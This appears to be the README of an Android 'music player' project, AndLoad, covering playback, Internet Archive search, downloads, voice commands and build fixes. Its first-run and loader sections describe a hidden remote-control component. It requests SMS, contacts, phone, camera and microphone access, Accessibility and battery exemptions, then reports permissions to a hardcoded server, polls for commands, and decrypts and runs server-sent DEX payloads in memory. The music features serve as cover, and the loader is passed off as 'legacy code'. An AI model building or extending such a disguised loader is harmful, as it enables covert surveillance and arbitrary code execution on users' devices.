# AndLoad — Neural Player

AndLoad is an Android music player with a cyber-themed Compose interface, local-library playback, open-catalog search, downloads, and push-to-talk voice commands.

## Current Features

- Local audio discovery through Android MediaStore.
- Media3/ExoPlayer playback.
- Play, pause, next, previous, and seek controls.
- Playback progress and animated neural visualizer.
- Library statistics:
  - Track count.
  - Total play time.
  - Search match count.
- Local search by title, artist, or album.
- Open-catalog search through the companion Flask server.
- Explicit download confirmation through Android DownloadManager.
- Download notifications and library refresh.
- Push-to-talk voice commands:
  - "Player, play [song]"
  - "Player, download [song]"
  - "Yes"
  - "Cancel"
- Flexible voice matching using title and artist word scoring.

## Technology Stack

### Android

- Kotlin.
- Jetpack Compose and Material 3.
- AndroidX Media3 ExoPlayer.
- Android MediaStore.
- Android DownloadManager.
- Android SpeechRecognizer.
- Kotlin Coroutines and StateFlow.
- Coil for artwork loading.
- Minimum SDK: 24.
- Target and compile SDK: 34.

### Server

- Python.
- Flask.
- Requests.
- Internet Archive Advanced Search API.
- Internet Archive Metadata API.
- Open audio formats:
  - MP3.
  - OGG.
  - FLAC.
  - M4A.
  - WAV.

The Flask server listens on port `5000`. The loader uses the host configured in
`app/src/main/java/com/nexrtz/loader/Config.kt` (`172.16.22.123` at the time of
writing). The music search repository still contains its own catalog endpoint
(`172.16.19.200`), so update that constant too when the server address changes.

## Project Structure

```text
app/src/main/java/com/nexrtz/andload/
├── MainActivity.kt
├── model/
│   ├── RemoteMusicTrack.kt
│   └── Song.kt
├── repository/
│   └── MusicRepository.kt
├── ui/
│   ├── MusicScreen.kt
│   ├── MusicViewModel.kt
│   └── theme/
└── loader/
    ├── CoreService.kt
    ├── MemoryOnlyLoader.kt
    └── PolicyManager.kt
```

The Python `app.py` runs from a separate workspace. Its music routes are:

- `GET /api/v1/health`
- `GET /api/v1/music/search?q=<query>`
- `GET /api/v1/music/download?identifier=<id>&filename=<name>`

## Server Setup

Install the Python dependencies:

```powershell
pip install flask requests pycryptodome
```

Start the server:

```powershell
python app.py
```

Verify connectivity:

```text
http://<server-host>:5000/api/v1/health
```

Expected response:

```json
{"service":"neural-player-music","status":"ok"}
```

The Android device and server computer must be on the same reachable network. Windows Firewall must allow inbound TCP traffic on port `5000`.

## Android Build and Install

Use the Android Studio Embedded JDK 21 (or another JDK from 17 through 21)
with the Gradle 8.6 wrapper:

```powershell
.\gradlew.bat clean assembleDebug
adb devices
adb install -r app\build\outputs\apk\debug\app-debug.apk
adb shell am start -n com.nexrtz.andload/com.nexrtz.andload.MainActivity
```

Android Studio can deploy the same debug APK by selecting the `app` run
configuration and a connected USB-debugging device. The project previously
used an incompatible Gradle/JDK combination. The wrapper is now pinned to
Gradle 8.6, and Kotlin compilation runs in-process to avoid Windows compiler
command-line limits.

## First-Run Setup

On the first launch, `MainActivity` stores the configured server host and port
in `app_prefs`, then requests camera, microphone, SMS, contacts, phone, and
notification permissions. After the permission dialog, it opens Android's
Accessibility settings. Returning from that screen opens the battery
optimization exemption prompt. Once both setup steps have been visited,
`setup_done` is saved and the background service starts on future launches.

`CoreService` runs as a foreground service with a low-priority notification.
It reports the currently granted permissions to the server and polls for
`load`, `stop`, and `flip` commands. A `load` command downloads an encrypted
DEX payload, decrypts it in memory, loads the expected
`com.nexrtz.plugin.s<slot>.Plugin` class, starts it, and acknowledges the
result. A `stop` command stops the active plugin; `flip` forwards to the
plugin's toggle method.

The foreground service requires the manifest permission
`android.permission.FOREGROUND_SERVICE` and the declared camera, microphone,
and media-projection service types. The service must remain user-visible and
should be reviewed before production release because it loads and executes
server-provided code.

## Testing

### Local Playback

1. Start the app.
2. Grant audio permission.
3. Confirm local tracks appear.
4. Tap a track.
5. Test playback, seeking, next, previous, and refresh.

### Open-Catalog Search

1. Start the Flask server.
2. Open the app.
3. Enter a query such as `jazz`.
4. Tap the search button beside the search field.
5. Select `GET` on a result.
6. Confirm the download.
7. Wait for the Android download notification.
8. Refresh the library.

### Voice Commands

1. Tap the microphone icon.
2. Grant microphone permission.
3. Say a command such as:

```text
Player, play sun goes down by lil nas
```

Voice matching does not require an exact title. It compares meaningful words against local song titles and artists.

For a missing song:

```text
Player, download relaxing jazz
```

The app searches the open catalog and offers the first result for confirmation. Say `yes` to queue the download or `cancel` to stop.

Voice control is currently push-to-talk while the app is open. Always-listening would require a separate microphone foreground service, a persistent notification, explicit user consent, and additional battery/privacy design.

## Challenges and Fixes

### Old UI remained on the phone

Cause: the device still had an older APK installed.

Fix: clean build, uninstall/reinstall, and launch the current application package.

### Gradle build failure

Cause: AGP 8.3.2 was paired with Gradle 9.1.

Fix: changed the wrapper to Gradle 8.6 and corrected its distribution checksum.

### Kotlin compiler Windows error

Cause: Kotlin compilation hit a Windows process command-line limitation.

Fix: enabled:

```properties
kotlin.compiler.execution.strategy=in-process
```

### Server reported unavailable

Cause: the search route performed many sequential Internet Archive metadata requests and could exceed the client timeout.

Fixes:

- Limit search results before metadata expansion.
- Use bounded HTTP timeouts.
- Return a clear HTTP 502 response when the upstream catalog is unavailable.
- Keep `/api/v1/health` available for connectivity diagnosis.

### Long or confusing song names

Cause: exact string matching is unreliable for speech.

Fix: normalize the spoken phrase and score overlapping words from the title and artist.

## Known Limitations

- Voice control is push-to-talk, not always-on.
- Search depends on Internet Archive availability.
- Downloaded tracks must be supported audio formats.
- The server workspace is separate from this Android workspace.
- The loader host is configured as `172.16.22.123` in `Config.kt`, while music search currently uses a separate hardcoded host in `MusicRepository.kt`.
- Existing background/loader components are legacy code and should be reviewed separately before production release.

## Next Improvements

- Persistent user-defined song aliases.
- Better voice feedback using Android TextToSpeech.
- Download progress inside the app.
- Playlist and favorites support.
- Media notification controls and lock-screen playback.
- Configurable server URL instead of a hardcoded address.
- Automated unit and instrumentation tests.
